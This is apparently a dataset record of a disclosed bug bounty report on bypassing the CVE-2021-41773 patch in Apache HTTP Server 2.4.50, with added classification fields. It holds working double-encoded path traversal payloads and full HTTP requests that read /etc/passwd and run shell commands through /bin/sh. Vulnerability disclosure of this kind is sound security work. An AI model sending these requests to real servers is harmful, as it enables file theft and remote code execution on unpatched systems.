{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "itsecurityco ",
  "title": "Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50",
  "content": "\nHello Apache team,\n@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.\nThese are the payloads:\n1) %%32%65%%32%65\n2) .%%32%65\n3) .%%32e\n4) .%2%65\nPoC Path Traversal\nGET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1\nHost: localhost:83\nsec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"94\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\nPoC RCE\nPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\nHost: 192.168.88.201\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,es;q=0.8\nIf-None-Match: \"2aa6-5cda88e8a6005-gzip\"\nIf-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT\nConnection: close\nContent-Length: 60\necho Content-Type: text/plain; echo; id; uname;apache2ctl -M\nImpact\nAn attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.\nIf files outside of these directories are not protected by the usual default configuration \"require all denied\", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 1000,
  "weaknesses": [
    "Path Traversal: '.../...//'"
  ],
  "screenshots": {},
  "disclosed_date": 1637383500,
  "report_url": "https://hackerone.com/reports/1404731",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a specially crafted HTTP GET request with path traversal sequences (e.g., /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd) to access sensitive files."
    ],
    [
      2,
      "For RCE, send a specially crafted HTTP POST request to execute arbitrary commands (e.g., /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh with a payload like 'echo Content-Type: text/plain; echo; id; uname; apache2ctl -M')."
    ]
  ],
  "vuln_description": "This vulnerability involves bypassing the patch for CVE-2021-41773 in Apache HTTP Server 2.4.50 by using specially crafted URL-encoded path traversal sequences (e.g., %%32%65 for '.') to access files outside the intended directories. If CGI scripts are enabled, this can lead to remote code execution (RCE).",
  "reason": "The attack requires knowledge of URL encoding techniques and the specific bypass for the patch, but the payloads are straightforward once the encoding trick is understood. The interaction between the path traversal and CGI execution is subtle but not highly complex.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}